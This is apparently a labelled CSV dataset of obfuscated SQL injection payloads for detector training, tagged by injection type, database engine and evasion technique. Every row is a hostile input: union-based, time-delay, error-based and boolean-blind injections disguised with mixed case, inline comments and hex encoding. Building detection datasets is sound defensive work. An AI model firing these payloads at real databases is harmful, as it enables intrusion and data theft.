payload,sqli_type,db_engine,evasion_tech,confidence,classification_method,source,context
"0O4 )<` ) && 0x0b0B0X2496 ""= ?(/**/ seLeCt or (seLECT;(sElEcT?(SELECT 3086))):NOt)likE!0B0b0Xc4e or (SELect (sELEcT (SElect (SELECT 2))));oR ""P""=""PP"" OR False#cOUnT ( *'^) <froM/**/rDb$fieLds As t0O0o0o0b0O0o1,rdB$TypeS aS t0b0b1011101001,rdb$COLLaTioNS As T0O3,RdB$fuNcTIons&AS-t6~{)* 'anD (seLect (SelEct 0X0b10100101c)) NOt like[ 0B1110101101100100010110110010101110011101 --*z<E8U Zw",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.0,rule,sqliv5_json,string_double_quote
"CalL REGeXP_SUbSTRINg_ ( REpeAt \( riGht ?( cHar ( (sELeCT 0b0O0x7640) ) ,0b0 ) ,(sELect?(SeLecT (SeLECT 500078806))) )?@,nulL=) ) Or '",unknown,unknown,case_variation|hex_string,0.0,rule,sqliv5_json,unknown
"0B0b1' )"" ]as fXUK wheRE*(selECT (sELeCT^(SELect?(seleCt 0x0B0b1010010101100111100001011000000100)))) LIkE 0X0x0B111001110 and mAKE_SeT/*;GF:$`*/(( 0o22119:LiKE 3xAE1,(SElEcT 0b101010011100) ) && : tRuE/*)Y<XV*/ oR} ""Y<IY(""%NOT liKe ""y Iy("" oR (sEleCT (SELect 3O0X0B0x19f7)) lIKe 3X11f8<ANd truE(--",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.0,rule,sqliv5_json,unknown
"3"" ') :) AS tMPZ WherE (seLEcT~0X1C0O125)/*Rz Fi84)(sElecT (seleCT (SElecT (SELECT 1)))):/`I$H $x m*/=~0B0X0B1110400151021&aND`MAke_sEt ( (SELecT 3xDf3O7) `LIkE] 0x480,0o2025+))~ oR<0b0B1+or (selECt (sElecT[0x29d8))+not+lIke&(Select (SeleCT 9x23D0o10O4)) $ or })3X0 or FAlSe =or $ 0x0X6X6O0]--",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.0,rule,sqliv5_json,unknown
"0x0B1'-wHErE (Select (SELecT 0x481)) liKe 0b0O0o01701 or (! sElect * frOm} +( SELECT `( >SlEEP/ (& (sELecT 0X5) ) [ ) * ) YdPu ). or 0B4X9C6 nOt:lIKe_0X0c2:+&& ""="" nOT like ""=^"" oR FALSE or fAlse\oR 0x1F9E\NoT Like (SelECT 2X1f9E) && (SeLEct (SElEcT (SelecT (SELECT 1)))) AND True --",unknown,unknown,case_variation|function_alternative|hex_string,0.0,rule,sqliv5_json,unknown
"0X0X0o0O0X1' ) % ) aNd cHAR ( (SeLecT 0B1101101) ) OR ChaR ( (SELECT (SELECT (SELECT 79))) ) OR ChAR .( (SelEcT 0x44) ) ` OR cHar ( 0x5a) ) &@= ReGexP_sUbstring (^ REPEAT ( rIGht ( chAr *( (SelecT (selEcT (selECT 0o12480))) ) ,(SELECT (SELECT 0)) ) ,(SEleCt 0O0b0xa86362491) )' ,NULl )& && TRUE oR faLse aNd 0X1 OR (SELECT (SELECT 0)) OR False OR False AND True --",unknown,unknown,case_variation|function_alternative|hex_string,0.0,rule,sqliv5_json,unknown
"0B0O1"" )]% wHere 0o3o0X4B0o0B10111021c ;liKe( 3X0b1X10f3d8C>or 0B0x2142!LikE BENcHmArK (, 0x3c0X4O16133,mD0B101 /*|;wg@C(0O0xqAlL */( 0X344D5a0o0X0C/*(selecT (Select 0x3))`[SEaE&Cf*/ )]{ ) >oR 0X0O722 not LikE 0X410 ANd}tRUE ANd TrUe Or (SELeCt 0X0b1010111Ff)=0X2x39b8 and '?'<>'?L' or fALSe oR fAlSe or""falSe OR fAlse#;_wX bkNrY bIX5MPi3Ih",time_blind,mysql,case_variation|comment_whitespace|inline_comment|hex_string,0.45,rule,sqliv5_json,unknown
"0X1 \ )`< <) /*E#U(q hPmi*/) ? && (SeLeCt}0x0b0b1010010101101010111101000110100100) =$ ( 'QqPjq' Or [ (! sELeCt CAse 0B1700001100090 wHeN (selEct 0b0b10010001100001001110011101000100110110110000) ThEn 0o0b0B1""elsE (SELECT 0) ENd frOM Rdb$DatAbASE *) ; Or 'qZvzq'@\) ANd ( ( (/ 0x37Ae LIkE 0x17ae2_",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.0,rule,sqliv5_json,unknown
"SELECt coUNT (] *~ ) fROM dOmain.DOmaInS;aS T0B110,domain.ColuMns/*B/cdPTkN< U^x+ */AS t2o0b0x3e8o6,dOmaIn.tABles aS}T9X0X0x0b101b170/*hJ;*/AnD [({?; (^} 'Xiyl'""LIke+'XiyL",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string|scientific_notation,0.0,rule,sqliv5_json,unknown
"SelEct _( Case wheN ( ?(sELecT (sELEct 7852)) =\ (seLecT 0x5EC4) ) THen?7855 ElSe&7852* ( seLect (sEleCt 0x1EaC) FrOm mysql.Db ) END ) && (seLEct 1) ANd ""0""=""0""#aH3",unknown,unknown,case_variation|hex_string,0.0,rule,sqliv5_json,string_double_quote
SELECT (/*~mO*/ CAsE.whEN ( (selEcT (sELEcT (SeLEcT 5706)))%/*wqWc/EcZy2qfAG*/= +0X2O13624.%) theN 0O5-eLse'0792* ;( SeLeCT (sEleCt 0x2230) from[MAsTer..sysdAtabaSES/*0PI*/?) eND ) OR (SeleCT 0x12d0o10) nOT = (SeLeCT (SELECT 9824)) aND 0b1b0X1)--,unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.0,rule,sqliv5_json,unknown
"0b1',or~$ (,-Select 'SbfT''WhErE 0B0b0x0B0xA0b0B100011100100810000101100010110111010111110110010010010C/*r3>qg*/&= /*@$2Ts*/0x1O20710",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.0,rule,sqliv5_json,unknown
"0x9b1""=wHerE (SELECT (SELECT/0x1ff9)) := [8089",unknown,unknown,case_variation|hex_string,0.0,rule,sqliv5_json,unknown
"6' OR ( sELECT 'xJtq' fROm dUal WHERE (SeLecT 1O43127) liKe (SELeCt (SeLECt (SELECT 5719))) or (sELECT (SelecT)(SeleCT 0X237B))) lIke ; (? OR 0x2232 nOt LIKe (sELeCT 0o0X0x8B0) And 0b10 Or false aND 1145=(SEleCt (sELECT (SELECT 1145)))# sElecT CouNT ( * ) FrOM sySiBm.SyStaBlEs As T1,SYsiBm.SYstAbles AS t5,SysiBM.SysTAbLes aS t5 )= ) ||'X4XcF}",unknown,oracle,case_variation|hex_string,0.06,rule,sqliv5_json,string_single_quote
"9b4%""& ) ) ) OR 0b10X2111=bEnChmARk/*(0D""{*/ ( 0x4C4b40,md5 ( 0x0b0x0O1146A0b0B0b1101000011001001011000000010011100011110100010100100101100101001000110110001110100110000100101100000101101011001101010000011001001 ) ) /**/ && \ ( )( /**/ ""%""=""",unknown,unknown,comment_whitespace|inline_comment|hex_string,0.0,rule,sqliv5_json,unknown
"1""/* (selECt (sELEcT 0x7));*/`) WheRe (sELEct (SELEcT>0B0O0x5A65)) lIKe 9827",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.0,rule,sqliv5_json,unknown
"5b0"" ) As{LRew WheRE/*E[/Lbr =t+Lexxmm*/(sELECt Or ""O""<>""o"" or _fAlSe && tRuE[anD (seLecT~(seLECt:(SeLEcT}(sElect (SELECT (SelecT 0X1)))))) AND 1#0X0x1o1f0B8305710) {lIKE 0x42B0O7`UnIOn AlL SeLECt NuLl,nuLl,NuLL,Null,NuLL,NuLL,NuLL OR ;faLsE;Or fALsE% or ?'ur2' NOT LIkE 'UR8'#q~2oVG",union_based,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.8,rule,sqliv5_json,string_single_quote
"0b10%' AND/*<w{T*/(SelEcT 0x0x320){` lIke dBmS_PiPE.recEiVE_mEsSAGE/**/ ( >chR ( 0X45 %) Or chr (/**/ (SELEcT?0b0x0B0x0B150F) ) || ChR ( (SeLECT:(seLeCT (SELECt (sELEct (SElecT (SeleCt (sELeCt (seleCt 101))))))))` ) oR ChR [( _0o0O54 )* ,4x5`') AnD truE oR faLSe`--",unknown,oracle,case_variation|comment_whitespace|inline_comment|hex_string,0.06,rule,sqliv5_json,string_single_quote
"1%"" ) *) )( aNd(SeLECT (sElEct (SELECt 3115)))$iN ~ ( < ( ""cHar ( 0x71: ) +char (> (SeLEcT (seleCT (selEcT 113))) ) +ChAr ( 0B5x0X0O0o0167760 ) +ChAR ( 0b0X1560B2 ) +CHAr ( 0o0B0O0X3C0x1 ) + ( SeLEct (& case whEn ( 0B0x19DEB233C3 LIKE 0o6O5x1c60 ) theN CHAR ^( }(sELEcT""49) ) else cHaR (. 0O65 :) END ) ) +ChAr ( 0X71 ) +CHaR ( (seLEcT 0x7a) ) .+cHAr ( (SelEct 282) ) +char ( (sEleCT (SELect (seLect 122))) ) +chAR ( (sELect (SELECt (sELecT 113))) ) ) && true oR (sELECT (sElect (SElEcT (seLect 0X0)))) AnD 1xf6=(SeleCT (SELECT (SeLecT 246))) AND (SeLeCT (SELEct (SeLECT 1))) oR FaLSE or~(seleCt (SELECT 0)) And TRUE Or fAlse and (SeLecT 1)|or (SelEct (sELEcT 0)) OR (SElEcT 0) and (seleCt (SELecT 2988))<>2381 And truE AND True || 0 aND 0X1 oR fALSE oR 0#_) && - _ -( ( ( ""%"" LiKE ""cI!?Lr{a'v&tuT~RMT'9_Hl9",unknown,unknown,case_variation|function_alternative|hex_string,0.0,rule,sqliv5_json,unknown
"1'[ || ( sEleCt<'fbSR' wHErE (seLeCT 0x1Edb) LIKe >7X8EDb~AND ELT (% 0O0b3O0x0x1039 LiKE [0xF0b0O0o13,(SElEcT[(sELECT 6O0X1C85)) ) /**/ &)/*(sElECT (SEleCT (SELECt (sELECt (SELeCT (sElecT (SELECT 3)))))))!t*,Y8ke*/ OR) '",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.0,rule,sqliv5_json,unknown
"1' )$ whErE 0x0o21a8 lIKE (seLecT (SelEct 6056)) Or>ROw ( (SELECT 1048),(selECt 4522) ) > ( sElect CouNT ( * ) ,concAT ( 0X7151706a71, ( SELECT ( ELt ( (sElEct 1015) $= (seLeCT (SelEcT 0o13635)),(selEcT (SELECT 1)) )^ )! ) ,0X717A0x2FFa71,floor ( rand ( (SeleCt (SELECT 0)) ) *(SELeCt 2)* =) ) x FRom ( sEleCT|(sELect (SeleCt 0o20450)).UNioN sELecT (SELECT 5584) UNion sEleCt:0XbEb UnION SeLecT 0X4BA ) A?gROuP bY-x ) /**/ oR ""k"" NOT like ""K"" Or FAlSE OR FaLSE AND True OR 9506 LIKE 0x257d --",union_based,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.8,rule,sqliv5_json,unknown
"0o2'; ) `as nvqK wheRE 0o0b0Xf0b100d=9XF5B OR ;0x333E= ( SeLeCT cOUnt ( * ;) + FrOM aLL_usErs T1,ALL_usErS?T2,ALl_useRs t3,all_uSERs/*/gm*/T5,ALL_UsErS t5 )+&aND TrUe OR fALse or(fALsE AnD (seleCT (seLECT 1))?AnD ""%VFp"" NoT lIke ""%VfPf"" AnD 0x1Ebf NoT lIkE (sELect 7876) or (SeLeCT (seLeCt (selEcT (SELECT (SELECT 0b0))))) && ""H"" LikE ""h"" or 'C'='cR'>or ""e"" liKe ""E!"" && TRuE --",boolean_blind,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.8,rule,sqliv5_json,unknown
"6b0x0b0b1100100o8b0x0o1o0B10B0B9B0O8o0b1101'_@})*}""<) !;; ) . unIon\ALL:SeLecT nuLL,NulL,NuLl,nUll--",union_based,unknown,case_variation|hex_string,0.8,rule,sqliv5_json,unknown
"0o0"" )* AS rDVm:WheRe 4X4o0x0b1061x12d8$_= 0X10d1 aND~SlEep /**/(= (SELECT!(SeleCT (SElECT-0X0b0x8))) *)\ And/**/'w}=yu']= 'w}=yU' Or FALSE(And (select (sElECT?(SElECt (sELEcT (SELeCT (SELECT (SELECT (SELECT 2)))))))) && +1 --",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.0,rule,sqliv5_json,unknown
"3"" ). ` ) ^Or?CHaR |(;[7O101 ) [Or chAr ( ;0b0o705 ) Or;CHAr][( (sElEcT (selECT^(sEleCT 0X61)))`?) ? oR cHar ( 0X0X0x32 )?` = ReGexp_SUBSTRINg` ( RePEAT**( RiGht `( cHAr/*N|aiD]banDyP@e.?VGl5&> hR;uJ; */!( -8x150d ) ,0b0X6B0O0x0B0B0B0 ) ,(seLECt]1X31e0o4X12Fb08) ) ,nULL ) ` AND (< (; ""oNHh"" lIKe ""oNhH",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string|scientific_notation,0.0,rule,sqliv5_json,unknown
"0O0X1'^ AnD EXp} ( ~ ( selEcT *:frOm ( SeLecT ConcAT [( 0x5121706A71, (/ SElECT >( eLt *( [0o0b0x0Ffe LIke/*cJ:lCLljxQE9Yoz?*/ (SeLecT (SELecT 0x0b0b0x1ffE)),0x6o4 ) ^)! ; )%"",0x5O1315A767a30,0O0x0X4e )> ) x ) ?) ] AND ;'bLIe'? lIkE 'BLiE",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.0,rule,sqliv5_json,unknown
"1O4b9O1'? )\ ( `selecT *( cAsE WhEn ,%( 0b0B0O0X0O0b1101eB lIKE] 0x0B1011eB ) ^tHen rEgexP_sUbSTrinG ( %rEpeAT ( lEFt ( cRYpt_kEY: ( ""CHAr< ( 0O0B3o101 ) oR CHAR/*(seLect<(selECT (seLeCT (seLeCt (seLeCT 0x6)))))@+&~'2w4 khO pC@Hi~ }}IflXHtk=e%(seLEcT (SELECt (SElECT (sElECt (SELECT 2)))))+pt?.ulx[ApD1*/@(* 6X8b101101 ^) ~Or ChAR/ (; 0x0b110101* )`?,nUll> ) ,0B0B0O0 )? ,0B3B1010110101010111115011111191001120101110100007110111001101110000201501001400050101111011110100 ) {,NULl ) !ELse cHar ( 0O0B0X0b100C( ) , OR Char ~( 0o101/<) OR: ChAR: ( (SelecT (SeLECt (seLect/**/(SElECt (SELECT 0X0X42)))))] ) Or cHar ( (select%(SElEcT 0X4A))& ) end ) FROm ( VAlUeS \( (sEleCT (selECt (sELeCT 0x0X0o2))) ) _ ) .)! aNd& ( 'yQMV' LikE *'yQMv",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.0,rule,sqliv5_json,unknown
"0x0X9' ANd ^0xCD0x0B10)!?lIKE ? liKe ( _'abcdEfG',UPPER ?( ,hEx }( /*4CN?yo+F;dKi.bL""pQ or 0X1443!=0x0b10110100011#uh{*/rANDoMbLOb \( -0X9o0x0B1B0b110DDb4b0b19011000111111100a0B100O0O0/1x0x2""(?)' )((? &) * ;)/*+Ze3+|<*/ ;}cA",unknown,unknown,comment_whitespace|inline_comment|hex_string,0.0,rule,sqliv5_json,unknown
"1', )< (as iRNj WHeRE (SElEct (seleCt 0x1c6A)) like (sELEcT (SELECT 7371)) anD 0x26f1 lIke ; ( SeleCT/*zCx`(SeLect 0B0X6)Yf*/0X1B38 FRom PG_sLEEP ( 6o0o0x0x5 ) ) AnD=TrUE OR (SeLEcT 0X0) oR false OR fALSe AND (SElEct (SElEcT (SELECT (SELECT 1)))) aNd tRue --",unknown,postgresql,case_variation|comment_whitespace|inline_comment|hex_string,0.06,rule,sqliv5_json,unknown
"1 ) aS SkBY_whERe 0X10Ad = (0X0XAad oR^Elt ( \0X1812 lIkE*(SelEct 0X183a),sLEeP:,( \(sElEcT (SELECT 4)) ) )$ and (seleCT (sELecT (sELect (SELEcT (sElEct 0Xda0))))) NOT LIke.(selEct (sELecT (SeLECT (selecT 0xD97)))) Or ""(SELEcT+0b0b0x1D6329F1d01F5c70620A73912c26Ec0x0o406b) noT;LIKE (sELEct (SElEcT 6717)) or ""6"" nOt LIke ""0O6"" oR FALSe aNd tRue&|and truE OR ""aq""=""aqy"" OR fAlSe Or FalSE --",unknown,unknown,case_variation|function_alternative|hex_string,0.0,rule,sqliv5_json,string_double_quote
"1B3O0X9BB0o5B0o6o0x6B0b0b1X0x8'*^oR] \*(@@sELEct*'HFbT'?Where!(SELECt (SELEct=0b0o0x0B0x0B3b7b0B1000010001110101011111000811010X0b0O0O6b10x0o0B4xb0b0b808C))=(sELEcT@0XcC) UnIon/*w_?+*a^0o0b111b0o12'? CO&<n6y;Hnx'.RF!{z`^NWz6TCM]{(SELECT](SELECT)0x3))<%R &((SELECT 5)*/aLl seleCT;NULL,NUll,null,nuLL,NUlL,nulL,nuLl,NuLl,nUll,NuLl--",union_based,unknown,case_variation|inline_comment|hex_string,0.8,rule,sqliv5_json,unknown
"1x1 ) /**/ ) < or Elt ( 0x13d0O3; LikE 0X0o20f1,Sleep (} (SeLEct 0O0X0) ) ) ` or (SeLect (select (SELEcT (SelecT (sElEcT 0X1bf2))))) nOT in (5X9B1401115114101,(SElecT 0O0X0b1bF6),0o10396) anD True or false^and tRue&&9xEfd=(seleCt (selECT 0B0Xefd))#y)W6z d6X >A",unknown,mysql,case_variation|comment_whitespace|inline_comment|hex_string,0.05,rule,sqliv5_json,in_clause
"0O1' ) { )or !( SelECt 2X2*; (& IF ( _ ~( (selecT * fROM (/**(SeLECt;(SelEcT^(seLEcT (sElECT 0x0))))>z7){(seLECT 0X7)&0x7:xJFa{*/ SelECT Concat ([ 0x0X6d6e0b111Aa71, ( }SeLEct ( elt [(/*xL)}1D3FBU (SELECT 2){*/ 0B0B0X0b1FB4_ like; (selecT 5x0X1fb1),0x1 =&) ]) .) ,0x0X0X0x2CDa0X2FfA0b0O0o0b0O0B0o115,0o0x0B0O116 ) ) s :) , 0X0b1010112011111100110101001601004011110300fffA, 0B0x0X0B1110101110010DcFb7118ffFa- {)~ ) / ) |",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string|scientific_notation,0.0,rule,sqliv5_json,unknown
"0b0o0O0o4"" ) / ) % ) pRoCEdUre+ANAlySe= ( ExTrACTvALuE |( >0o6x249B,COnCat /**/(. 0X5C, (];BEnChMaRk ( 0x4d80a0,md5 ( 0O0b2x4B774c0X20 ) /**/ ) > ) ) ): ,0x1 ) `AnD (SeLEct 2XADc). Not likE 0X5B0x2784AA4CCd or fAlSe AnD =(SELeCt/*,=f 7x E0&~{)I*/(sElEcT (SELECt (SEleCt 1)))) And*""aO"" LIKe ""ao"" And trUE Or/**/FaLSe and (SeLEcT (selECT 4)) AnD-(seLECT (select (sELEcT (SELECT 4653)))) NoT lIKE 0x1148 and trUe or (SeLEcT 0xf05) LIKe (SElEct (SelecT (SElEct 0xf06))) oR faLSe Or FaLSE or 2567 NOT LIKE (SELECT 2567)#;G1 ^uw HZ(S",time_blind,mysql,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.45,rule,sqliv5_json,unknown
"0b1'{ANd-MAke_set/*SXN| S or FalSE or faLSe#p3ivje 29*/ (=%4X23d2X3_= (selEcT;(SElEct 0x9X0x1dd3)),0O0x28C0o0*`)!!*anD>'LNwE'='lnWEhd_",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.0,rule,sqliv5_json,unknown
"1""\&&/*S)UHStKj*.tZrfX'Q0X8eJo5T3m0O5qe*/4X1E4C liKE dBmS_uTILity.sQlId_to_sqLHAsH ( ( chr ( (SELECT (SElEct (seLECT (selECT (SeleCt (SeLEcT;0X71)))))) ) ||cHr |(/ (SeLecT 0X0x47) ) || CHr ( (SELecT (SELEct (selEcT 0x36))) )+ ||cHR ([ 0x5A ) Or CHr ( 3x87 ) [ ||| ( _seLect ( cAsE When *( )0x1e0B0B160C% lIKE (SelEcT 6X0e4C) ) thEn 0B0x1 eLSE!(SElect (SeLEcT 0X0))&end >) FRoM DUaL ) +OR chR (& (SelECt (seLEct (sELect (seLeCT (SELEct (seLeCT (SELEct (SELECT (SELECT (SELECT (SELECT 133)))))))))))+ ) oR CHr ( 2X0B0x0b0B0o0B313a ) .or cHr &( (SelECT 0x76) ) /**/ oR cHr; ( 0x0b4111010{ ) or CHR >( :2O0x0X70< *) /:;) ? ) ` anD ""jgcv"" ]lIkE ""jGCV",error_based,oracle,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string|scientific_notation,0.51,rule,sqliv5_json,unknown
"3B1'+ ( sElECT iJCk WHere;0X26e0o11 LIKE * 0B0x91ADeC437e9 OR ( sElEct (SEleCT (seLEcT (SeLEct (SELECT 2))))* ( iF ( ( sEleCt * FRom ( SeLeCt CONcat ( 0X8b11011010110111091114010a73, ( sELECt< ( ELt (/**/_8113 LikE (SELeCT (SElECt (sELeCt 0x1fb1))),0o1|_ ) ) + ) ,0X712a0o1377A20,0x78 ) ) s ) , (SeleCT (SELeCt (sELeCt 0x7538DcFB7617FFfa))), 0X7598DcfB7617ffFA ) ) ) ) +'",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string|scientific_notation,0.0,rule,sqliv5_json,unknown
"1' :): WheRe (SelEct 0X0o1556) }LiKe 2B0x4748862E6o35{or 0X0B1B08 liKe ( -SeLect COUnt <( * |)] From*dOmAIn.dOMAIns as\t1,DoMain.COLumns;aS/*ssSu; 'y{rt~0X0Mmu9r3D^LL[+9*/t8b0o0X2,DOmaIN.TaBLeS)As t3. ) OR fAlSe oR: FAlSE && true Or{FalSe oR faLSe Or fALSE AND True --",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string|scientific_notation,0.0,rule,sqliv5_json,unknown
"9' )&/**/ ( Or` `(SeLect 0x0b1111011011)??lIKE- (% SeLEct CouNT (. *[`)/*q%cU-0b0B0x0X0b1000%`R:+ `K:v*/ FROm.DOMaIn.DomAinS;As T0B1001X3O5O0B10x8o5,DOMaIn.COLUMnS:as t0X0B11b0o0o11X0x7,DomaIn.taBLes aS[t0o10 ?) ,and, ((?'XJvR'='xJvr",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.0,rule,sqliv5_json,unknown
"8%'^? ) /*YzT2Jm[KfaFHZuC:,*/ &) / !) /[\AND -{0O2b0b111x0o11B0o0B11000101010001400c0B0x0B0b1115101601=(SElect{1X8d0B110d) anD/*;*?\;*/ :(} ; (~ (_ '%'<[LIKE '",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.0,rule,sqliv5_json,unknown
0b0b1' ) ; $) )^/*a*/ ANd 0x6870 >lIkE (= 'qqpJq' Or ^( SElEcT cAse^(sELEcT (sElECt (SelEcT (SelEcT (SELECT (SELECT (SELECT (SELECT 7280)))))))) WhEn (sELEcT 0O94140) tHEN (sELeCT 0b0x1) ELSE 0b3 END fRom RdB$DaTaBasE ) LIKe OR 'qzVZQ' )] And ;(/ ( ( 'BWka' like 'BwKA,unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.0,rule,sqliv5_json,unknown
"0X0o8%""?|) RLike SlEEP>:( '9/*xJ(t\p(U:*/ ) ""/ ` or , |0O0x0x1eFE/NOT iN)(8X1Efd,(SElEct]0x1efe),(sEleCt 3b0O0b7o0o0o0o24775))/**/anD_6B0X8}}!oR FALsE anD 0X2134 NoT LIKe, (sEleCt 0X2125) &&!0x19Ae not LIKE 0X0X15aF or_0x0 Or fALSE or*fAlSe*AnD TrUE OR""5795=(sELEcT (SELEct (SELECT (SELECT 0b1011010100100)))) OR False#Zo>Y]wT8",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.0,rule,sqliv5_json,unknown
"5B1'+ ( /*9q,;t*/SElECT 'ASMj' wHErE (sELECt 0x1E80) liKe 0X1E70 || (sEleCt (seLect (SeLEct 0o4601))) liKe DBMS_pIpe.REcEivE_MEssAGE ( ChR ( (seLeCT 142) ) OR.chr (> (SelEcT (SelECt 65)) )+? OR cHr (: 65 ) OR ChR ( \(Select (SeLeCt (seleCT (SELECT 105)))) ) ,0b102 _) ) \=+'",time_blind,oracle,case_variation|comment_whitespace|inline_comment|hex_string|scientific_notation,0.46,rule,sqliv5_json,unknown
"1']In~BoOLEan MODE~ )-;}OR*(SElect 0X2562) =.beNChMaRK{ ( ;(SelECT 0x4C5ec8),mD5 ]( 2X624A8B1001013007501 )=/*'4*/).-} OR <0o0Xa91 NOt LIKE (sELeCt 0xA60) Or>0X0X4 OR FaLsE or FALSE AND TRue oR FalSe#w[WG.n,(seLECT (sElecT (sELEct 0x0))))`W",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.0,rule,sqliv5_json,unknown
"9b0O0B8' ) OR (SeLeCT 1b0X9184f1a78c0) +likE =]*(( 'abcDeFg',UPpEr $(/**/ HEx\'( randombLob ( +0x0x1dCd0B0b1001000111010111100111001101101011010110110/(sEleCt 0X0B0x0o5)<\ ) . ) ^) . ):",time_blind,sqlite,case_variation|comment_whitespace|inline_comment|hex_string,0.53,rule,sqliv5_json,unknown
"2'/ oR (! SeLEct 'yTwz' fROM/*(SELECT 8)<1ak*/dual&whERe+8b301211910007=0xBD1%And (~ (SELECT 0x13af) =*(seleCt""5303) ):<*(seleCT (sELeCt (seleCT (sELeCt 0x12F))))~+)?_ or '",unknown,oracle,case_variation|comment_whitespace|inline_comment|hex_string,0.06,rule,sqliv5_json,unknown
eND/*uG-j(x_*/aNd !( [0x0b0b10101100000010C8 likE` 0x24C0b0b1002,unknown,unknown,comment_whitespace|inline_comment|hex_string,0.0,rule,sqliv5_json,unknown
"SElECT/*CHXuf*/* FROM gENeRATE_SERiEs ;( 7536,7536,CASe wheN |( 7536 LikE (sElEcT (sELeCT 0x1d63)) ) tHeN (SELECT (SELECT 1)) ElSe (SElEcT 0) End ) Limit 0b1--",unknown,postgresql,case_variation|comment_whitespace|inline_comment|hex_string,0.06,rule,sqliv5_json,unknown
"1 ) ANd 0x105b LIKe DbMs_piPe.RECEivE_mEsSAGe ( cHR ( 0o0x45 ) oR CHr ( 0O6o113~ ) $or chr ( (SElEcT/*(=t\*/(SelECT (selEct (SelECt (SeLECT (SeleCt (SelecT 0x67))))))) ) OR cHR!*( && '%:R{' <> '%:r{c' or (SeLeCt (SeLect 0)) aNd (selECt 1755) NOT LIke (sElEcT 0O0x6Fa) or fAlse or fALSE or 's;n'='S;N2'#0X52 ) ,0B101 ) And TRuE ANd TRUE<-- lG[]eQ`U:",time_blind,oracle,case_variation|comment_whitespace|inline_comment|hex_string,0.41,rule,sqliv5_json,string_single_quote
"1' ) ) ?]) OR ( SeLEcT 0x2* ("" iF ( ~ ( SeLEct * from ( -SelECT ConcAT ( 1B0O0o0X7161706a0O0o0o253, ( SELEcT ( ELt ~( (SElect 0X1Fb1) = 0x0X1fB1,(seLEct (sELect (SeLEct (SelECT (SELect (sElect (SELECT (selEct (sElECt (SeLeCT (SeLEcT 1))))))))))) "" ) ) . ) "",0x767A767a61,0x78 ) ) s ) , 0O0B0x7538dcfB7517fffa, 0X7533DcFB0x0o86701FFfA ) ) ;) and ( ( ( 'qpuy' LiKe 'qpUY",unknown,unknown,case_variation|function_alternative|hex_string,0.0,rule,sqliv5_json,unknown
"0O1' where (SeLEcT (seleCt 0x0o4355)) =/*;fl(W""((sELECt 0x3)?i*/ (SElecT=6X0O2405)&ANd (selEct (selecT:(seLECt 0x15B0b100)))= )( sELECT cOUnT ?( * ) From]aLl_usERs,T6,ALL_uSers T7,all_UseRS t8,ALL_userS<T0o0o4,aLl_usERS T0x0o0O7 {)) OR faLSe;aNd """"WVw""<>""""wVwy"" && tRUE or FAlseaNDtrUe;--",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.0,rule,sqliv5_json,unknown
